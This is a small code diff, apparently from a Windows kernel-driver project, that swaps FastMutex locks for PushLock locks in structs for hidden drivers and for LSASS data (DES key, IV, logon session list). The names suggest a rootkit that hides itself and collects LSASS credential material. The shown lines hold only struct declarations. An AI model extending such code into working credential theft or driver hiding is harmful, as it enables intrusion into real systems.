@@ -118,12 +118,12 @@ struct HiddenDriverEntry {
 
 struct HiddenItemsList {
 	SIZE_T Count;
-	FastMutex Lock;
+	PushLock Lock;
 	PLIST_ENTRY Items;
 };
 
 struct LsassInformation {
-	FastMutex Lock;
+	PushLock Lock;
 	KeyInformation DesKey;
 	KeyInformation Iv;
 	SIZE_T Count;
@@ -132,7 +132,7 @@ struct LsassInformation {
 };
 
 struct LsassMetadata {
-	FastMutex Lock;
+	PushLock Lock;
 	bool Collected;
 	PLIST_ENTRY LogonSessionList;
 	PBCRYPT_GEN_KEY DesKey;
